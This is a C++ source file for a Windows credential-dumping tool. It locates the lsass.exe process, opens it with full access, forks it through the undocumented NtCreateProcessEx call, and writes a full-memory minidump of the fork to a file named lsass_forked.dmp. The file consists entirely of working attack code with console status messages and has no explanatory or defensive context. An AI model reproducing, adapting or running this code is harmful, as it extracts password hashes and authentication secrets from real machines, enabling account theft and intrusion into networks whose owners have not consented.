#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <winternl.h>
#include <tchar.h>

#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "ntdll.lib")

using namespace std;

typedef NTSTATUS(NTAPI* pNtCreateProcessEx)(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN HANDLE SectionHandle OPTIONAL,
    IN HANDLE DebugPort OPTIONAL,
    IN HANDLE ExceptionPort OPTIONAL);

int main() {
    DWORD lsassPID = 0;
    HANDLE lsassHandle = NULL;
    HANDLE forkedProcess = NULL;
    HANDLE outFile = CreateFile(L"lsass_forked.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (_wcsicmp(processEntry.szExeFile, L"lsass.exe") == 0) {
                lsassPID = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    if (lsassPID == 0) {
        cout << "[-] Could not find lsass.exe process." << endl;
        return 1;
    }

    wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;

    // Open handle to lsass.exe process
    lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
    if (lsassHandle == NULL) {
        cout << "[-] Failed to open lsass.exe process." << endl;
        return 1;
    }

    // Get the address of NtCreateProcessEx
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll) {
        cout << "[-] Failed to get handle to ntdll.dll." << endl;
        return 1;
    }

    pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    if (!NtCreateProcessEx) {
        cout << "[-] Failed to get address of NtCreateProcessEx." << endl;
        return 1;
    }

    // Create a forked process
    NTSTATUS status = NtCreateProcessEx(&forkedProcess, PROCESS_ALL_ACCESS, NULL, lsassHandle, 0, NULL, NULL, NULL);
    if (status != 0) {
        cout << "[-] Failed to create forked process." << endl;
        return 1;
    }

    cout << "[+] Forked process created successfully." << endl;

    // Get the PID of the forked process
    DWORD forkedProcessPID = GetProcessId(forkedProcess);

    wcout << "[+] Got forkedProcessPID: " << forkedProcessPID << endl;

    // Dump the forked process
    BOOL isDumped = MiniDumpWriteDump(forkedProcess, forkedProcessPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (isDumped) {
        cout << "[+] lsass forked process dumped successfully!" << endl;
    }
    else {
        cout << "[-] Failed to dump lsass forked process." << endl;
    }

    CloseHandle(outFile);
    CloseHandle(lsassHandle);
    CloseHandle(forkedProcess);

    char input;
    std::cout << "Break" << std::endl;
    std::cin >> input;

    return 0;
}
